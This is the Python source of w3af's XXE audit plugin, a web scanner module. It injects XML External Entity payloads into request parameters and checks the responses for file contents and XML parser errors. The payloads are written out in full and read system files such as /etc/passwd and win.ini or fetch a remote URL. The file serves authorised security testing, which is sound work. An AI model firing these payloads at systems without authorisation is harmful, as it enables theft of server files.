"""
xxe.py

Copyright 2018 Andres Riancho

This file is part of w3af, http://w3af.org/ .

w3af is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation version 2 of the License.

w3af is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with w3af; if not, write to the Free Software
Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA

"""
import itertools

from lxml import etree

import w3af.core.data.constants.severity as severity
import w3af.core.controllers.output_manager as om

from w3af.core.controllers.plugins.audit_plugin import AuditPlugin
from w3af.core.data.constants.file_patterns import FILE_PATTERNS
from w3af.core.data.misc.encoding import smart_str_ignore
from w3af.core.data.fuzzer.fuzzer import create_mutants
from w3af.core.data.quick_match.multi_in import MultiIn
from w3af.core.data.kb.vuln import Vuln


class xxe(AuditPlugin):
    """
    Find XXE vulnerabilities.

    :author: Andres Riancho (andres.riancho@gmail.com)
    """
    WINDOWS_FILES = [
        '%SYSTEMDRIVE%\\boot.ini',
        '%WINDIR%\\win.ini',
    ]

    LINUX_FILES = [
        '/etc/passwd',
    ]

    REMOTE_FILES = [
        'http://w3af.org/xxe.txt'
    ]

    # This is the only content stored in the https://w3af.org/xxe.txt file
    REMOTE_SUCCESS = '667067323'

    ENTITY_DEF = '<!DOCTYPE xxe_test [ <!ENTITY xxe_test SYSTEM "%s"> ]>'
    ENTITY = '&xxe_test;'

    GENERIC_PAYLOADS = [
        # This is the most effective payload I've found until now, tested using
        # libxml (python wrapper, but should apply to all libxml versions).
        '<!DOCTYPE xxe_test [ <!ENTITY xxe_test SYSTEM "%s"> ]><x>&xxe_test;</x>',

        '<?xml version="1.0" encoding="ISO-8859-1"?>'
        '<!DOCTYPE xxe_test [ <!ENTITY xxe_test SYSTEM "%s"> ]><x>&xxe_test;</x>',

        '<?xml version="1.0" encoding="ISO-8859-1"?>'
        '<!DOCTYPE xxe_test [<!ELEMENT foo ANY><!ENTITY xxe_test SYSTEM "%s">]>'
        '<foo>&xxe_test;</foo>',
    ]

    LINUX_PAYLOADS = [
        '<!DOCTYPE xxe_test [ <!ENTITY xxe_test SYSTEM "file://%s"> ]><x>&xxe_test;</x>',
    ]

    WINDOWS_PAYLOADS = [
        # Note that this one uses file:/// instead of file://
        '<!DOCTYPE xxe_test [ <!ENTITY xxe_test SYSTEM "file:///%s"> ]><x>&xxe_test;</x>',
    ]

    XML_PARSER_ERRORS = [
        # PHP
        'xmlParseEntityDecl',
        'simplexml_load_string',
        'xmlParseInternalSubset',
        'DOCTYPE improperly terminated',
        'Start tag expected',
        'No declaration for attribute',
        'No declaration for element',

        # libxml and python
        'failed to load external entity',
        'Start tag expected',
        'Invalid URI: file:///',
        'Malformed declaration expecting version',
        'Unicode strings with encoding',

        # java
        'must be well-formed',
        'Content is not allowed in prolog',
        'org.xml.sax',
        'SAXParseException',
        'com.sun.org.apache.xerces',

        # ruby
        'ParseError',
        'nokogiri',
        'REXML',

        # golang
        'XML syntax error on line',
        'Error unmarshaling XML',
        'conflicts with field',
        'illegal character code'
        
        # .NET
        'XML Parsing Error',
        'SyntaxError',
        'no root element',
        'not well-formed',
    ]

    MAX_XML_PARAM_MUTANTS = 5
    TOKEN_XXE = '__TOKEN_XXE1__'

    file_pattern_multi_in = MultiIn(FILE_PATTERNS)
    parser_errors_multi_in = MultiIn(XML_PARSER_ERRORS)

    def _should_inject_parameter(self, param_name, param_value):
        """
        The objective is to reduce the number of HTTP requests sent by this plugin.

        The idea is simple, only try to inject into a parameter if the parameter
        is empty or contains something that looks like XML.

        :param param_name: The parameter name
        :param param_value: The original value of the parameter
        :return: True if we should inject into this parameter
        """
        if not param_value:
            return True

        if 'xml' in param_name.lower():
            return True

        if '<' in param_value and '>' in param_value:
            return True

        return False

    def _create_payloads(self, param_name, original_value):
        """
        Use the class attributes to create all the payloads, yield them using
        an iterator.

        :yield: Payloads as strings
        """
        #
        # First we send the generic tests, which don't take the original value
        # into account and are likely to work on some cases
        #
        for file_name in itertools.chain(self.WINDOWS_FILES,
                                         self.LINUX_FILES,
                                         self.REMOTE_FILES):
            for payload in self.GENERIC_PAYLOADS:
                yield payload % file_name

        for file_name in self.LINUX_FILES:
            for payload in self.LINUX_PAYLOADS:
                yield payload % file_name

        for file_name in self.WINDOWS_FILES:
            for payload in self.WINDOWS_PAYLOADS:
                yield payload % file_name

        #
        # Now we parse the original value using our XML parser, and modify that
        # XML in order to inject the payloads there. In order to do that, we
        # need the original value to be an xml document
        #
        if not original_value:
            return

        xml_root = self._parse_xml(param_name, original_value)
        if xml_root is not None:
            for payload in self._create_xml_payloads(xml_root):
                yield payload

    def _create_xml_payloads(self, xml_root):
        """
        This method receives the XML as captured by w3af during crawling and
        modifies it to add entities which will inject file contents

        Note that we can't use a generic "create xml mutants" since this method
        needs to do two different things:

            * Add the entity at the beginning of the XML
            * Add the entity reference as a tag text

        :param xml_root: The xml object as parsed by etree.fromstring
        :return: A string representing the xml object, with added entities
        """
        xml_mutant_count = 0

        for tag in xml_root.iter():
            if tag.text is None:
                continue

            tag_orig = tag.text
            tag.text = self.TOKEN_XXE

            for file_name in itertools.chain(self.WINDOWS_FILES,
                                             self.LINUX_FILES):
                dtd = self.ENTITY_DEF % file_name
                xml_body = etree.tostring(xml_root).replace(self.TOKEN_XXE, self.ENTITY)
                yield dtd + xml_body

            # Restore the original value to inject in the next parameter
            tag.text = tag_orig

            # Test XXE in the first MAX_XML_PARAM_MUTANTS parameters found in the XML
            xml_mutant_count += 1
            if xml_mutant_count > self.MAX_XML_PARAM_MUTANTS:
                break

    def _parse_xml(self, param_name, original_value):
        """
        Parse the XML into an object

        :param param_name: The name of the parameter as seen by the HTML parser
        :param original_value: The XML as sent by the application
        :return: The XML object or None if parsing failed
        """
        # This is a safety measure to prevent us from loading large XML files
        # into memory (high memory usage) or loading a very complex xml which
        # might require a lot of CPU time
        if len(original_value) > 1024 * 1024:
            return None

        try:
            original_value_str = smart_str_ignore(original_value)
        except Exception, e:
            msg = ('Failed to encode unicode original value to string'
                   ' in _parse_xml(). Exception: "%s"')
            om.out.debug(msg % e)
            return None

        # Secure, don't introduce XXE in our XXE detection plugin ;-)
        parser = etree.XMLParser(load_dtd=False,
                                 no_network=True,
                                 resolve_entities=False)

        try:
            xml_root = etree.fromstring(original_value_str, parser=parser)
        except Exception, e:
            msg = ('Failed to parse "%s..." as XML to inject XXE tests.'
                   ' The parameter name where injection failed was "%s".'
                   ' Exception: "%s"')
            args = (original_value[:25], param_name, e)
            om.out.debug(msg % args)
            return None

        return xml_root

    def _injectable_mutants_iterator(self, freq, mutants):
        """
        :param freq: The fuzzable request
        :param mutants: All the mutants
        :yield: Only the mutants that need to be tested
        """
        for mutant in mutants:
            original_value = mutant.get_token_original_value()
            param_name = mutant.get_token_name()

            if not self._should_inject_parameter(param_name, original_value):
                continue

            for payload in self._create_payloads(param_name, original_value):
                m = mutant.copy()
                m.set_token_value(payload)
                yield m

    def audit(self, freq, orig_response, debugging_id):
        """
        Tests an URL for XXE vulnerabilities.

        :param freq: A FuzzableRequest
        :param orig_response: The HTTP response associated with the fuzzable request
        :param debugging_id: A unique identifier for this call to audit()
        """
        # Create some fake mutants to check the fuzzable request original value
        mutants = create_mutants(freq, [''], orig_resp=orig_response)

        self._send_mutants_in_threads(self._uri_opener.send_mutant,
                                      self._injectable_mutants_iterator(freq, mutants),
                                      self._analyze_result,
                                      debugging_id=debugging_id)

    def _analyze_result(self, mutant, response):
        """
        Analyze results of the send_mutant method.
        """
        orig_resp_body = mutant.get_original_response_body()
        body = response.get_body()

        for pattern_match in self._find_patterns(body):

            # Remove false positives
            if pattern_match in orig_resp_body:
                continue

            # Only report vulnerabilities once
            if self._has_bug(mutant):
                return

            # Create the vulnerability!
            desc = 'An XML External Entity injection was found at: %s'
            desc %= mutant.found_at()

            v = Vuln.from_mutant('XML External Entity', desc, severity.HIGH,
                                 response.id, self.get_name(), mutant)

            v.add_to_highlight(pattern_match)

            self.kb_append_uniq(self, 'xxe', v)
            return

        # We get here when there are no vulnerabilities in the response
        # but we still want to flag any parsing errors which might be
        # pointers to other (more complex to identify and exploit)
        # vulnerabilities
        for parser_error in self.parser_errors_multi_in.query(body):

            # Do not report that we found an error when we already found
            # something with higher priority in the same mutant
            if self._has_bug(mutant):
                return

            # Do not report the same error twice
            if self._has_bug(mutant, kb_varname='errors'):
                return

            desc = ('An XML library parsing error was found at: %s. These'
                    ' errors usually indicate that an XML injection is'
                    ' possible.')
            desc %= mutant.found_at()

            v = Vuln.from_mutant('XML Parsing Error', desc, severity.LOW,
                                 response.id, self.get_name(), mutant)

            v.add_to_highlight(parser_error)

            self.kb_append_uniq(self, 'errors', v)
            return

    def _find_patterns(self, body):
        """
        Find the patterns we need to confirm the vulnerability

        :param body: The HTTP response body
        :yield: All the patterns we find
        """
        if self.REMOTE_SUCCESS in body:
            yield self.REMOTE_SUCCESS

        for file_pattern_match in self.file_pattern_multi_in.query(body):
            yield file_pattern_match

    def get_long_desc(self):
        """
        :return: A DETAILED description of the plugin functions and features.
        """
        return """
        This plugin finds XML External Entity injections.
        
        To find this vulnerabilities the plugin sends multiple specially crafted
        XML documents to all parameters which are used by the application to send
        XML data, and searches for specific strings in the response body.
        """
